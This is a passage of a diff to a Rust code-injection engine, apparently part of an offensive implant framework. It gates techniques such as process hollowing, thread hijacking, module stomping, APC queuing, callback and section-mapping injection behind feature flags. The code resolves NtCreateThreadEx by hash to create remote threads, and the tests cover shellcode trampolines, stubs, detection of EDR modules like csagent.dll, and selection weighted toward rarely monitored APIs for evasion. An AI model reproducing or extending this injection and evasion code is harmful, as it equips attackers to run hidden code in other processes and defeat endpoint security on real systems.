             InjectionError::InjectionFailed {
-                technique: InjectionTechnique::ThreadHijack,
+                technique: InjectionTechnique::ProcessHollow,
                 reason: "cannot resolve ntdll base".to_string(),
             }
         })?;
@@ -10083,7 +10500,7 @@ unsafe fn create_suspended_thread(
         pe_resolve::hash_str(b"NtCreateThreadEx\0"),
     )
     .ok_or_else(|| InjectionError::InjectionFailed {
-        technique: InjectionTechnique::ThreadHijack,
+        technique: InjectionTechnique::ProcessHollow,
         reason: "cannot resolve NtCreateThreadEx".to_string(),
     })?;
 
@@ -10120,7 +10537,7 @@ unsafe fn create_suspended_thread(
 
     if status < 0 || h_thread.is_null() {
         return Err(InjectionError::InjectionFailed {
-            technique: InjectionTechnique::ThreadHijack,
+            technique: InjectionTechnique::ProcessHollow,
             reason: format!("NtCreateThreadEx failed: status={:#x}", status),
         });
     }
@@ -10163,7 +10580,7 @@ unsafe fn execute_via_apc(
                 ),
             });
         }
-        log::info!(
+        tracing::info!(
             "injection_engine: queued APC at {:#x} on alertable thread {} in pid {}",
             start_addr,
             tid,
@@ -10210,29 +10627,39 @@ unsafe fn execute_via_apc(
 pub fn parse_technique(name: &str) -> Result<InjectionTechnique, String> {
     match name {
         "ProcessHollow" => Ok(InjectionTechnique::ProcessHollow),
+        #[cfg(feature = "module-stomp")]
         "ModuleStomp" => Ok(InjectionTechnique::ModuleStomp),
         "EarlyBirdApc" => Ok(InjectionTechnique::EarlyBirdApc),
+        #[cfg(feature = "thread-hijack")]
         "ThreadHijack" => Ok(InjectionTechnique::ThreadHijack),
+        #[cfg(feature = "fiber-inject")]
         "FiberInject" => Ok(InjectionTechnique::FiberInject),
+        #[cfg(feature = "context-only")]
         "ContextOnly" => Ok(InjectionTechnique::ContextOnly),
         "TransactedHollowing" => Ok(InjectionTechnique::TransactedHollowing),
         "DelayedModuleStomp" => Ok(InjectionTechnique::DelayedModuleStomp),
+        #[cfg(feature = "module-stomp")]
         "ExistingModuleStomp" => Ok(InjectionTechnique::ExistingModuleStomp),
+        #[cfg(feature = "threadpool-inject")]
         "ThreadPool" => Ok(InjectionTechnique::ThreadPool { variant: None }),
+        #[cfg(feature = "thread-hijack")]
         "WaitingThreadHijack" => Ok(InjectionTechnique::WaitingThreadHijack {
             target_pid: 0,
             target_tid: None,
         }),
+        #[cfg(feature = "callback-inject")]
         "CallbackInjection" => Ok(InjectionTechnique::CallbackInjection {
             target_pid: 0,
             api: None,
         }),
+        #[cfg(feature = "section-map")]
         "SectionMapping" => Ok(InjectionTechnique::SectionMapping {
             target_pid: 0,
             exec_method: None,
             enhanced: false,
         }),
         "NtSetInfoProcess" => Ok(InjectionTechnique::NtSetInfoProcess { target_pid: 0 }),
+        #[cfg(feature = "threadpool-inject")]
         s if s.starts_with("ThreadPool:") => {
             let variant_str = &s["ThreadPool:".len()..];
             let variant = parse_threadpool_variant(variant_str)?;
@@ -10240,6 +10667,7 @@ pub fn parse_technique(name: &str) -> Result<InjectionTechnique, String> {
                 variant: Some(variant),
             })
         }
+        #[cfg(feature = "callback-inject")]
         s if s.starts_with("CallbackInjection:") => {
             let api_str = &s["CallbackInjection:".len()..];
             let api = parse_callback_api(api_str)?;
@@ -10248,6 +10676,7 @@ pub fn parse_technique(name: &str) -> Result<InjectionTechnique, String> {
                 api: Some(api),
             })
         }
+        #[cfg(feature = "section-map")]
         s if s.starts_with("SectionMapping:") => {
             let method_str = &s["SectionMapping:".len()..];
             if method_str.eq_ignore_ascii_case("enhanced") {
@@ -10266,17 +10695,16 @@ pub fn parse_technique(name: &str) -> Result<InjectionTechnique, String> {
             }
         }
         other => Err(format!(
-            "unknown technique {:?}. Valid: ProcessHollow, ModuleStomp, \
-             EarlyBirdApc, ThreadHijack, ThreadPool[:Variant], FiberInject, \
-             ContextOnly, WaitingThreadHijack, CallbackInjection[:Api], \
-             SectionMapping[:Method|Enhanced], NtSetInfoProcess, \
-             TransactedHollowing, DelayedModuleStomp, ExistingModuleStomp",
+            "unknown technique {:?}. Valid: ProcessHollow, \
+             EarlyBirdApc, NtSetInfoProcess, TransactedHollowing, \
+             DelayedModuleStomp",
             other
         )),
     }
 }
 
 /// Parse a `ThreadPoolVariant` name string.
+#[cfg(feature = "threadpool-inject")]
 fn parse_threadpool_variant(name: &str) -> Result<ThreadPoolVariant, String> {
     match name {
         "Work" => Ok(ThreadPoolVariant::Work),
@@ -10296,6 +10724,7 @@ fn parse_threadpool_variant(name: &str) -> Result<ThreadPoolVariant, String> {
 }
 
 /// Parse a `CallbackApi` name string.
+#[cfg(feature = "callback-inject")]
 fn parse_callback_api(name: &str) -> Result<CallbackApi, String> {
     match name {
         "EnumWindows" => Ok(CallbackApi::EnumWindows),
@@ -10326,13 +10755,15 @@ fn parse_callback_api(name: &str) -> Result<CallbackApi, String> {
 }
 
 /// Parse a `SectionExecMethod` name string.
+#[cfg(feature = "section-map")]
 fn parse_section_exec_method(name: &str) -> Result<SectionExecMethod, String> {
     match name {
         "Apc" => Ok(SectionExecMethod::Apc),
         "Thread" => Ok(SectionExecMethod::Thread),
         "Callback" => Ok(SectionExecMethod::Callback),
+        "Direct" => Ok(SectionExecMethod::Direct),
         other => Err(format!(
-            "unknown SectionExecMethod {:?}. Valid: Apc, Thread, Callback",
+            "unknown SectionExecMethod {:?}. Valid: Apc, Thread, Callback, Direct",
             other
         )),
     }
@@ -10345,6 +10776,7 @@ mod tests {
     use super::*;
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "context-only", feature = "section-map", feature = "callback-inject"))]
     fn auto_select_svchost() {
         let techniques = auto_select_techniques("svchost.exe");
         assert!(matches!(
@@ -10367,6 +10799,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "context-only", feature = "section-map", feature = "callback-inject"))]
     fn auto_select_explorer() {
         let techniques = auto_select_techniques("explorer.exe");
         assert!(matches!(
@@ -10389,6 +10822,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "context-only", feature = "module-stomp"))]
     fn auto_select_service() {
         let techniques = auto_select_techniques("msiscsi_svc.exe");
         assert!(matches!(
@@ -10400,6 +10834,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "context-only"))]
     fn auto_select_generic() {
         let techniques = auto_select_techniques("notepad.exe");
         assert!(matches!(
@@ -10410,6 +10845,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "fiber-inject")]
     fn error_display() {
         let err = InjectionError::ProcessNotFound {
             name: "foo.exe".to_string(),
@@ -10425,6 +10861,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "threadpool-inject")]
     fn technique_serde_roundtrip() {
         let t = InjectionTechnique::ThreadPool {
             variant: Some(ThreadPoolVariant::Work),
@@ -10437,6 +10874,7 @@ mod tests {
     // ── Tests for pre-injection reconnaissance ────────────────────────────
 
     #[test]
+    #[cfg(feature = "module-stomp")]
     fn viability_safe_serializable() {
         let v = InjectionViability::Safe {
             arch_match: true,
@@ -10451,6 +10889,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "module-stomp")]
     fn viability_has_edr_module_serializable() {
         let v = InjectionViability::HasEDRModule {
             modules: vec!["csagent.dll".to_string()],
@@ -10500,6 +10939,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "module-stomp"))]
     fn technique_recommendation_high_threads() {
         // High thread count → WaitingThreadHijack is recommended (stealthiest).
         let recommended = if 60 > 50 {
@@ -10517,6 +10957,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "module-stomp")]
     fn technique_recommendation_low_threads() {
         // Very few threads → EarlyBirdApc.
         let recommended = if 2 < 3 {
@@ -10528,6 +10969,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "module-stomp"))]
     fn technique_recommendation_moderate_threads() {
         // Moderate thread count → WaitingThreadHijack (safest default).
         let recommended = if !(10 > 50) && !(10 < 3) {
@@ -10547,6 +10989,7 @@ mod tests {
     // ── WTH-specific tests ───────────────────────────────────────────────────
 
     #[test]
+    #[cfg(feature = "thread-hijack")]
     fn wth_serde_roundtrip() {
         let wth = InjectionTechnique::WaitingThreadHijack {
             target_pid: 4242,
@@ -10562,6 +11005,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "thread-hijack")]
     fn wth_serde_without_tid() {
         let wth = InjectionTechnique::WaitingThreadHijack {
             target_pid: 9999,
@@ -10576,6 +11020,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "thread-hijack")]
     fn wth_trampoline_encoding() {
         // build_wth_trampoline should produce exactly 19 bytes with the
         // expected x86-64 encoding.
@@ -10613,6 +11058,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "thread-hijack")]
     fn wth_trampoline_zero_addr() {
         let trampoline = build_wth_trampoline(0);
         assert_eq!(trampoline.len(), 19);
@@ -10621,6 +11067,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "thread-hijack")]
     fn wth_auto_select_always_first() {
         // WaitingThreadHijack should always be the first (highest priority)
         // technique in auto_select_techniques for any target process.
@@ -10649,6 +11096,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "thread-hijack")]
     fn wth_display_in_error() {
         let err = InjectionError::InjectionFailed {
             technique: InjectionTechnique::WaitingThreadHijack {
@@ -10662,6 +11110,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "thread-hijack")]
     fn wth_variant_equality() {
         let a = InjectionTechnique::WaitingThreadHijack {
             target_pid: 100,
@@ -10680,6 +11129,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "context-only"))]
     fn wth_not_equal_to_other_variants() {
         let wth = InjectionTechnique::WaitingThreadHijack {
             target_pid: 100,
@@ -10791,6 +11241,7 @@ mod tests {
     // ── ContextOnly technique tests ──────────────────────────────────────
 
     #[test]
+    #[cfg(feature = "context-only")]
     fn context_only_in_technique_enum() {
         let t = InjectionTechnique::ContextOnly;
         let json = serde_json::to_string(&t).unwrap();
@@ -10800,6 +11251,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "context-only"))]
     fn context_only_always_second_in_auto_select() {
         // ContextOnly should always be the second technique (after WTH)
         // for any target process name.
@@ -10827,6 +11279,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "context-only"))]
     fn context_only_fallback_chain_includes_thread_hijack() {
         // When ContextOnly fails, ThreadHijack should be in the fallback chain.
         let techniques = auto_select_techniques("notepad.exe");
@@ -10834,6 +11287,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "context-only")]
     fn build_restore_trampoline_correct_size() {
         // Trampoline should be:
         //   mov rsp, imm64 (10) + mov rbp, imm64 (10) +
@@ -10855,6 +11309,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "context-only")]
     fn build_restore_trampoline_values() {
         let rip = 0xAAAA_BBBB_CCCC_DDDD_u64;
         let rsp = 0x1111_2222_3333_4444_u64;
@@ -10903,6 +11358,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "context-only")]
     fn stack_payload_limit_reasonable() {
         // Stack delivery limit should be at least 1KB and at most 4KB.
         assert!(CONTEXT_ONLY_STACK_PAYLOAD_LIMIT >= 1024);
@@ -10910,6 +11366,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "context-only")]
     fn error_display_context_only() {
         let err = InjectionError::InjectionFailed {
             technique: InjectionTechnique::ContextOnly,
@@ -10923,6 +11380,7 @@ mod tests {
     // ── Callback injection tests ──────────────────────────────────────────
 
     #[test]
+    #[cfg(feature = "callback-inject")]
     fn callback_api_serde_roundtrip() {
         for api in [
             CallbackApi::EnumSystemLocalesA,
@@ -10945,6 +11403,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "callback-inject")]
     fn callback_api_display_format() {
         assert_eq!(
             CallbackApi::EnumSystemLocalesA.to_string(),
@@ -10962,6 +11421,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "callback-inject")]
     fn callback_injection_technique_serde_roundtrip() {
         let t = InjectionTechnique::CallbackInjection {
             target_pid: 1234,
@@ -10973,6 +11433,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "callback-inject")]
     fn callback_injection_technique_none_api() {
         let t = InjectionTechnique::CallbackInjection {
             target_pid: 5678,
@@ -10984,6 +11445,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "context-only", feature = "section-map", feature = "callback-inject"))]
     fn callback_injection_in_auto_select() {
         // Verify CallbackInjection appears in auto-select results for various targets.
         let techniques = auto_select_techniques("svchost.exe");
@@ -11009,6 +11471,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "callback-inject")]
     fn auto_select_callback_api_returns_valid_variant() {
         // Run auto-select many times to verify it always returns a valid variant.
         for _ in 0..100 {
@@ -11032,6 +11495,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "callback-inject")]
     fn auto_select_callback_api_distribution() {
         // Verify weighted distribution: run 1000 selections and check that
         // the rarely-monitored APIs appear more often than commonly-monitored ones.
@@ -11070,6 +11534,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "callback-inject")]
     fn callback_stub_layout() {
         // Verify the universal callback stub is reasonable size and well-formed.
         let stub = build_callback_stub(0x4141_4141_4141_4141);
@@ -11108,6 +11573,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "callback-inject")]
     fn callback_stub_different_addresses() {
         let stub1 = build_callback_stub(0x1000);
         let stub2 = build_callback_stub(0x2000);
@@ -11127,6 +11593,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "callback-inject")]
     fn error_display_callback_injection() {
         let err = InjectionError::InjectionFailed {
             technique: InjectionTechnique::CallbackInjection {
@@ -11143,11 +11610,13 @@ mod tests {
     // ── Section mapping injection tests ────────────────────────────────
 
     #[test]
+    #[cfg(feature = "section-map")]
     fn section_exec_method_serde_roundtrip() {
         for method in [
             SectionExecMethod::Apc,
             SectionExecMethod::Thread,
             SectionExecMethod::Callback,
+            SectionExecMethod::Direct,
         ] {
             let json = serde_json::to_string(&method).unwrap();
             let method2: SectionExecMethod = serde_json::from_str(&json).unwrap();
@@ -11156,13 +11625,16 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "section-map")]
     fn section_exec_method_display() {
         assert_eq!(SectionExecMethod::Apc.to_string(), "Section-Apc");
         assert_eq!(SectionExecMethod::Thread.to_string(), "Section-Thread");
         assert_eq!(SectionExecMethod::Callback.to_string(), "Section-Callback");
+        assert_eq!(SectionExecMethod::Direct.to_string(), "Section-Direct");
     }
 
     #[test]
+    #[cfg(feature = "section-map")]
     fn section_mapping_technique_serde_roundtrip() {
         let t = InjectionTechnique::SectionMapping {
             target_pid: 1234,
@@ -11175,6 +11647,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "section-map")]
     fn section_mapping_technique_enhanced_serde() {
         let t = InjectionTechnique::SectionMapping {
             target_pid: 5678,
@@ -11188,6 +11661,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(feature = "section-map")]
     fn section_mapping_none_exec_method() {
         let t = InjectionTechnique::SectionMapping {
             target_pid: 9999,
@@ -11200,6 +11674,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "context-only", feature = "section-map", feature = "callback-inject"))]
     fn section_mapping_in_auto_select() {
         // Verify SectionMapping appears in auto-select results for various targets.
         for target in &["svchost.exe", "explorer.exe", "notepad.exe", "termsvc.exe"] {
@@ -11241,6 +11716,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "context-only", feature = "section-map", feature = "callback-inject"))]
     fn section_mapping_ranking_order() {
         // Verify the full ranking: WTH > ContextOnly > SectionMapping > NtSetInfoProcess > CallbackInjection
         let techniques = auto_select_techniques("svchost.exe");
@@ -11265,16 +11741,18 @@ mod tests {
 
     #[test]
     fn page_align_function() {
+        let ps = crate::page_size::system_page_size();
         assert_eq!(page_align(0), 0);
-        assert_eq!(page_align(1), 0x1000);
-        assert_eq!(page_align(0x1000), 0x1000);
-        assert_eq!(page_align(0x1001), 0x2000);
-        assert_eq!(page_align(0xFFF), 0x1000);
-        assert_eq!(page_align(0x2000), 0x2000);
-        assert_eq!(page_align(0x10000), 0x10000);
+        assert_eq!(page_align(1), ps);
+        assert_eq!(page_align(ps), ps);
+        assert_eq!(page_align(ps + 1), ps * 2);
+        assert_eq!(page_align(ps - 1), ps);
+        assert_eq!(page_align(ps * 2), ps * 2);
+        assert_eq!(page_align(ps * 16), ps * 16);
     }
 
     #[test]
+    #[cfg(feature = "section-map")]
     fn error_display_section_mapping() {
         let err = InjectionError::InjectionFailed {
             technique: InjectionTechnique::SectionMapping {
@@ -11317,6 +11795,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "context-only", feature = "section-map", feature = "callback-inject"))]
     fn ntsetinfo_in_auto_select() {
         // Verify NtSetInfoProcess appears in auto-select results for various targets.
         for target in &["svchost.exe", "explorer.exe", "notepad.exe", "termsvc.exe"] {
@@ -11362,6 +11841,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "thread-hijack", feature = "context-only", feature = "section-map", feature = "callback-inject"))]
     fn ntsetinfo_ranking_order() {
         // Verify the full ranking: WTH > ContextOnly > SectionMapping > NtSetInfoProcess > CallbackInjection
         let techniques = auto_select_techniques("svchost.exe");
@@ -11396,6 +11876,7 @@ mod tests {
     }
 
     #[test]
+    #[cfg(all(feature = "context-only", feature = "module-stomp", feature = "section-map", feature = "thread-hijack"))]
     fn ntsetinfo_distinct_from_other_techniques() {
         let nsip = InjectionTechnique::NtSetInfoProcess { target_pid: 100 };
         // Must not equal any other technique
